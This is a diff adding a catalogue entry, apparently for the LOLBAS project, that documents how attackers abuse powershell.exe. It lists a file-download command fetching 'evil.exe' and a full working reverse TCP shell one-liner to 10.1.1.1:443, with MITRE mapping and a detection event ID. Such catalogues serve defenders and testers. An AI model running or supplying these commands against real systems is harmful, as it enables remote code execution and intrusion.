@@ -1,0 +1,45 @@
+---
+Name: Powershell.exe
+Description: PowerShell is a task automation and configuration management framework from Microsoft, consisting of a command-line shell and the associated scripting language.
+Author: 'Jai Minton'
+Created: '2021-05-19'
+Commands:
+  - Command: powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.1.1.1/evil.exe', 'evil.exe')
+    Description: Download the file 'evil.exe' hosted at 10.1.1.1 and store in a file called 'evil.exe'
+    Usecase: Allows downloading of arbitrary files such as payloads.
+    Category: Download
+    Privileges: Administrator, User
+    MitreID: T1059.001 
+    MitreLink: https://attack.mitre.org/techniques/T1059/001/
+    OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10
+  - Command: powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.1.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    Description: Execute a reverse TCP shell back to client 10.1.1.1 on port 443.
+    Usecase: Used to establish a reverse shell allowing access to an operating system command line from a remote IP.
+    Category: Execute
+    Privileges: Administrator, User
+    MitreID: T1059.001 
+    MitreLink: https://attack.mitre.org/techniques/T1059/001/
+    OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10
+Full_Path:
+  - Path: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+  - Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Code_Sample: 
+- Code:
+Detection:
+ - IOC: Microsoft-Windows-PowerShell/Operational Event Log ID 4104 when Script Block Logging is enabled (https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)
+Resources:
+  - Link: https://www.powershellempire.com/
+  - Link: https://powersploit.readthedocs.io/en/latest/
+  - Link: https://github.com/samratashok/nishang
+Acknowledgement:
+  - Person: Matt Graeber
+    Handle: '@mattifestation'
+  - Person: Chris Campbell
+    Handle: '@obscuresec'
+  - Person: Joseph Bialek
+    Handle: '@JosephBialek'
+  - Person: Will
+    Handle: '@harmj0y'
+  - Person: Nikhil SamratAshok Mittal
+    Handle: '@samratashok'
+---
